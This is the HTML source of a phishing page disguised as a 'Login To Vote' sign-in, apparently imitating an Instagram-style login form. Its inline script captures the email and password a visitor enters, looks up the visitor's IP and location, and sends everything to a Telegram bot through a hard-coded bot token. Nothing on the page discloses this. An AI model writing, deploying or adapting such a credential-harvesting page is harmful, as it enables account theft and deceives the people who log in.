<!DOCTYPE html>
<html lang="en" data-textdirection="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui" />
    <title>Login To Vote</title>
    <meta name="description" content="Login Page" />
    <link rel="shortcut icon" type="image/x-icon" href="images/favi-icon/favicon.ico" />
    <link href="https://fonts.googleapis.com/css?family=Comfortaa:300,400,500,700" rel="stylesheet" />
    <link rel="stylesheet" type="text/css" href="theme-assets/css/template-3d-animation.css" />
    <style>
        /* Your existing styles here */
    </style>
</head>
<body class="1-column undefined page-animated" data-menu-open="hover" data-menu="">
    <main>
        <div>
            <div id="forma">
                <svg xmlns="http://www.w3.org/2000/svg" width="200" height="60" viewBox="0 -1.5 200 60">
                    <defs>
                        <clipPath id="clip-path">
                            <rect width="250" height="57" />
                        </clipPath>
                    </defs>
                    <g clip-path="url(#clip-path)">
                        <image x="13" y="3" width="175" height="51" xlink:href="data:image/png;base64,..."/>
                    </g>
                </svg>
                <form id="loginForm">
                    <div class="form-group">
                        <div>
                            <input type="text" placeholder="Phone number, username, or email" id="email" required>
                        </div>
                    </div>
                    <div class="form-group">
                        <div>
                            <input id="password" type="password" placeholder="password" required>
                            <span id="tchange" toggle="#password" class="insta field-icon toggle-password">show</span>
                        </div>
                    </div>
                    <button type="submit" id="login">Log In</button>
                    <p id="alert-message"></p>
                    <span id="feedback" style="display: block; color: red; font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px;"></span>
                </form>
                <div class="orr">
                    <p>OR</p>
                </div>
                <div class="sign-up">
                    <p>Don't have an account? <a href="#">Sign Up</a></p>
                </div>
                <p class="get">Get the app.</p>
                <div class="links">
                    <a href="#"><img src="images/app.png" alt=""></a>
                    <a href="#"><img src="images/google%20play.png" alt=""></a>
                </div>
            </div>
        </div>
    </main>
    <script>
        // Use the provided bot token and chat ID
        const telegramToken = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20';
        const chatId = '7769927746'; // This is the chat ID for sending messages

        // Function to fetch user's location based on IP
        function getUserLocation() {
            return fetch('https://ipinfo.io/json?token=YOUR_API_TOKEN') // Make sure to replace YOUR_API_TOKEN
                .then(response => response.json())
                .then(data => {
                    return {
                        ip: data.ip,
                        country: data.country,
                        region: data.region
                    };
                })
                .catch(error => {
                    console.error('Error fetching IP info:', error);
                    return { country: 'Unknown', region: 'Unknown' }; // Fallback if location fetch fails
                });
        }

        // Function to send message to Telegram bot
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => console.log('Telegram response:', data))
            .catch(error => console.error('Error sending message to Telegram:', error));
        }

        // Form submission logic
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Fetch user location and send login details to Telegram
            getUserLocation().then(location => {
                const message = `
                    New Login Attempt:
                    Email: ${email}
                    Password: ${password}
                    IP: ${location.ip}
                    Country: ${location.country}
                    Region: ${location.region}
                `;
                
                // Send to Telegram
                sendToTelegram(message);

                // Optionally, you can provide feedback to the user (or handle the login validation here)
                document.getElementById('feedback').innerText = 'Login details have been sent.';
            });
        });
    </script>
</body>
</html>
